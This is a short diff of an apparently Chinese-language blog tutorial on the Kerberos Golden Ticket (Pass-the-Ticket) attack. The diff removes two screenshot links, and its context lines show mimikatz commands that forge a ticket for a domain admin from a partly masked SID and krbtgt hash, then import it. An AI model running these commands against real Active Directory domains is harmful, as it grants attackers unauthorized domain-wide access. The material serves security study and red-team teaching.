@@ -59,13 +59,11 @@ mimikatz # kerberos::tgt
 mimikatz # kerberos::golden /user:AD_admin_user /domain:domain_name /sid:S-1-5-21-168xxxxx-3676xxxxxx1-34xxxx0176 /krbtgt:30eef769c3xxxxxxxxxxxcbc4e /ticket:AD_admin_user.kiribi
 ```
 命令执行完成后，将在本目录下生成文件AD_admin_user.kiribi  
-![create tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/create%20tgt_1.jpg?raw=true)  
 
 4、导入tgt 
 ``` 
 mimikatz # kerberos::ptt AD_admin_user.kiribi
 ```
-![import tgt](https://github.com/PythonPig/PythonPig.github.io/blob/master/images/Pass%20the%20Ticket%E2%80%94%E2%80%94Golden%20Ticket/import%20tgt_1.jpg?raw=true)  
 
 5、查看导入是否成功  
 ```
